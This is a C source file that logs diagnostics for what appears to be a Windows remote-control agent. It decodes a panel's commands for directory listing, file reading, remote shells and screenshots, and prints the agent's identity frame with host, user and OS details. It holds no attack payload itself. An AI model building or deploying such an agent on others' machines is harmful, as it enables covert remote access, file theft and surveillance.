/* report.c - everything printed for the human (see report.h).
 */

#include "report.h"
#include "types.h"
#include "peb.h"
#include "djb2.h"
#include "logger.h"


/* ---------------------------------------------------------------------------
 * ws_buffer_type_name - WinHTTP's WebSocket buffer type, as a string.
 * ------------------------------------------------------------------------- */
const char *ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type)
{
    switch (type) {
    case WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE:  return "binary-message";
    case WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE: return "binary-fragment";
    case WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE:    return "utf8-message";
    case WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE:   return "utf8-fragment";
    case WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE:           return "close";
    default:                                             return "unknown";
    }
}

/* ---------------------------------------------------------------------------
 * command_name - the relay-protocol name of an incoming command opcode.
 * ------------------------------------------------------------------------- */
const char *command_name(unsigned char opcode)
{
    switch (opcode) {
    case CMD_HELLO:            return "Hello";
    case CMD_LIST_DIRECTORY:   return "ListDirectory";
    case CMD_READ_FILE:        return "ReadFile";
    case CMD_HASH_FILE:        return "HashFile";
    case CMD_WRITE_SHELL:      return "WriteShell";
    case CMD_READ_SHELL:       return "ReadShell";
    case CMD_GET_DISPLAYS:     return "GetDisplays";
    case CMD_GET_SCREENSHOT:   return "GetScreenshot";
    case CMD_CLOSE_SHELL:      return "CloseShell";
    case CMD_EXIT:             return "Exit";
    case CMD_OPEN_SHELL:       return "OpenShell";
    default:                   return "unknown";
    }
}

/* Classic 16-bytes-per-line hex dump with an ASCII column. */
void hex_dump(const unsigned char *data, DWORD length)
{
    for (DWORD row = 0; row < length; row += 16) {
        LOG_INFO("    %04lx  ", row);
        for (DWORD i = 0; i < 16; i++) {
            if (row + i < length)
                LOG_INFO("%02x ", data[row + i]);
            else
                LOG_INFO("   ");
            if (i == 7)
                LOG_INFO(" ");
        }
        LOG_INFO(" |");
        for (DWORD i = 0; i < 16 && row + i < length; i++) {
            unsigned char c = data[row + i];
            LOG_INFO("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        LOG_INFO("|\n");
    }
}

/* Decode the command-specific part (everything after the 1-byte opcode) so
 * the terminal says WHAT the panel asked for, not just raw bytes. */
void describe_command_payload(unsigned char opcode,
                              const unsigned char *p, DWORD len)
{
    if (len == 0) {
        LOG_INFO("    payload: (empty)\n");
        return;
    }

    switch (opcode) {
    case CMD_LIST_DIRECTORY:            /* UTF-16LE path + NUL */
    case CMD_HASH_FILE: {
        LOG_INFO("    payload: path = \"");
        for (DWORD i = 0; i + 1 < len; i += 2) {
            unsigned char lo = p[i], hi = (i + 1 < len) ? p[i+1] : 0;
            unsigned short wc = (unsigned short)(lo | (hi << 8));
            if (wc == 0) break;         /* NUL terminator */
            LOG_INFO("%c", (wc >= 0x20 && wc < 0x7f) ? wc : '.');
        }
        LOG_INFO("\"\n");
        break;
    }
    case CMD_READ_FILE: {               /* u64 size, u64 offset, then path */
        if (len >= 16) {
            unsigned long long size = 0, offset = 0;
            for (int i = 7; i >= 0; i--)   size   = (size   << 8) | p[i];
            for (int i = 15; i >= 8; i--) offset = (offset << 8) | p[i];
            LOG_INFO("    payload: size = %llu, offset = %llu, path = \"",
                   size, offset);
            for (DWORD i = 16; i + 1 < len; i += 2) {
                unsigned short wc = (unsigned short)(p[i] | (p[i+1] << 8));
                if (wc == 0) break;
                LOG_INFO("%c", (wc >= 0x20 && wc < 0x7f) ? wc : '.');
            }
            LOG_INFO("\"\n");
        } else {
            LOG_INFO("    payload: (too short for ReadFile)\n");
        }
        break;
    }
    case CMD_OPEN_SHELL:
        LOG_INFO("    payload: (empty)\n");
        break;
    case CMD_WRITE_SHELL: {             /* u64 shellId, then UTF-8 input + NUL */
        if (len >= 8) {
            unsigned long long id = 0;
            for (int i = 7; i >= 0; i--) id = (id << 8) | p[i];
            LOG_INFO("    payload: shell = %llu, input = \"", id);
            for (DWORD i = 8; i < len && p[i] != '\0'; i++) {
                unsigned char c = p[i];
                LOG_INFO("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
            }
            LOG_INFO("\"\n");
        } else {
            LOG_INFO("    payload: (too short for WriteShell)\n");
        }
        break;
    }
    case CMD_READ_SHELL:
    case CMD_CLOSE_SHELL: {             /* u64 shellId */
        if (len >= 8) {
            unsigned long long id = 0;
            for (int i = 7; i >= 0; i--) id = (id << 8) | p[i];
            LOG_INFO("    payload: shell = %llu\n", id);
        } else {
            LOG_INFO("    payload: (too short for %s)\n",
                   opcode == CMD_READ_SHELL ? "ReadShell" : "CloseShell");
        }
        break;
    }
    case CMD_GET_SCREENSHOT: {          /* u32 display, u32 quality, u32 full */
        if (len >= 12) {
            LOG_INFO("    payload: display = %u, quality = %u, fullscreen = %u\n",
                   (unsigned)(p[0] | (p[1] << 8) | (p[2] << 16) |
                              ((unsigned)p[3] << 24)),
                   (unsigned)(p[4] | (p[5] << 8) | (p[6] << 16) |
                              ((unsigned)p[7] << 24)),
                   (unsigned)(p[8] | (p[9] << 8) | (p[10] << 16) |
                              ((unsigned)p[11] << 24)));
        } else {
            LOG_INFO("    payload: (too short for GetScreenshot)\n");
        }
        break;
    }
    default:
        LOG_INFO("    payload: (%lu bytes, see hex dump above)\n", len);
        break;
    }
}

/* Print one received command: header, decoded opcode and payload, hex
 * dump, printable text. Explicit length - the payload is NOT a C string. */
void print_command(int index, const incoming_message *msg)
{
    LOG_INFO("[%d] Received: type=%d (%s), len=%lu%s\n",
           index, (int)msg->type, ws_buffer_type_name(msg->type), msg->length,
           msg->truncated ? " [TRUNCATED]" : "");

    if (msg->length == 0) {
        LOG_ERROR("    payload: (empty)\n");
        return;
    }

    unsigned char opcode = msg->data[0];
    LOG_INFO("    command: 0x%02x - %s\n", opcode, command_name(opcode));
    describe_command_payload(opcode, msg->data + 1, msg->length - 1);

    DWORD dump_len = (msg->length < HEXDUMP_LIMIT) ? msg->length
                                                   : HEXDUMP_LIMIT;
    hex_dump(msg->data, dump_len);
    if (msg->length > dump_len)
        LOG_INFO("    ... (%lu more bytes not dumped)\n", msg->length - dump_len);

    LOG_INFO("    text: \"");
    for (DWORD i = 0; i < msg->length; i++) {
        unsigned char c = msg->data[i];
        LOG_INFO("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
    }
    LOG_INFO("\"\n");

    if (opcode == CMD_HELLO)
        LOG_INFO("[+] panel asks: who are you? (Hello)\n");
}

/* Print the outgoing identity frame field by field (the mirror of
 * print_command: everything WE send is shown too, not just what we get). */
void print_identity_frame(const unsigned char frame[IDENTITY_FRAME_SIZE],
                          int frame_len)
{
    /* Numeric fields, little-endian (v5 layout, see protocol.h). */
    unsigned status = frame[0]  | (frame[1]  << 8) |
                      (frame[2] << 16) | ((unsigned)frame[3]  << 24);
    unsigned api    = frame[4]  | (frame[5]  << 8) |
                      (frame[6] << 16) | ((unsigned)frame[7]  << 24);
    unsigned breed  = frame[8]  | (frame[9]  << 8) |
                      (frame[10]<< 16) | ((unsigned)frame[11] << 24);
    unsigned build  = frame[21]| (frame[22] << 8) |
                      (frame[23]<< 16) | ((unsigned)frame[24] << 24);
    unsigned is64   = frame[25];

    LOG_INFO("[<] Identity frame (%d bytes):\n", frame_len);
    LOG_INFO("    api     = %u, breed = %u (0=PIA, 1=this agent)\n", api, breed);
    LOG_INFO("    status  = %u\n", status);
    LOG_INFO("    uuid    = ");
    for (int i = 0; i < 16; i++) {
        LOG_INFO("%02x", frame[4 + i]);
        if (i == 3 || i == 5 || i == 7 || i == 9) LOG_INFO("-");
    }
    LOG_INFO("  (machine, .NET Guid order)\n");
    LOG_INFO("    host    = \"%s\"\n", (const char *)(frame + 20));
    LOG_INFO("    user    = \"%s\"\n", (const char *)(frame + 276));
    LOG_INFO("    arch    = \"%s\"\n", (const char *)(frame + 532));
    LOG_INFO("    platform= \"%s\"\n", (const char *)(frame + 564));
    LOG_INFO("    os      = \"%s\"\n", (const char *)(frame + 596));
    LOG_INFO("    build   = %u, commit = \"%s\", api = %u, 64-bit = %u\n",
           build, (const char *)(frame + 728), api, is64);
    LOG_INFO("    mask    = ");
    for (int i = 0; i < 8; i++)
        LOG_INFO("%02x ", frame[742 + i]);
    LOG_INFO("(categories: %s%s%s)\n",
           (frame[742] & 1) ? "FileSystem " : "",
           (frame[742] & 2) ? "Shell " : "",
           (frame[742] & 4) ? "Display" : "");
    if ((frame[742] & 7) == 0)
        LOG_INFO("            (information-only agent)\n");


    DWORD dump_len = (frame_len < HEXDUMP_LIMIT) ? (DWORD)frame_len
                                                 : HEXDUMP_LIMIT;
    hex_dump(frame, dump_len);
    if ((DWORD)frame_len > dump_len)
        LOG_INFO("    ... (%d more bytes not dumped)\n", frame_len - (int)dump_len);
}
